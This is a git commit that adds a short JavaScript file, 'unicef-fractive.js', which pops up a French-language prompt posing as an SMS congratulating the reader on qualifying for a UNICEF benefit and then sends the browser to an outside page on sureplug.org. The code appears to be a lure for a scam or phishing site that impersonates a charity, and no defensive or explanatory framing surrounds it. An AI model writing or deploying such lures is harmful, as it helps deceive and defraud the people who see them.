4bd90afe1ac3123e21f66a7e49569bb83395dfc4
surepluger <adigunkola666@gmail.com>
2025-04-03 07:17:51 +0100

    Create unicef-fractive.js

---
+++ unicef-fractive.js
@@ -0,0 +1,5 @@
+var password = 'APPLIQUER'
+password=prompt('SMS: Félicitations, vous êtes qualifié à (Unicef), appuyez sur OK, soumettez la candidature maintenant ','APPLIQUER');
+if (password != 'APPLIQUER') {
+location.href='https://sureplug.org/unicef-fr.html';
+}
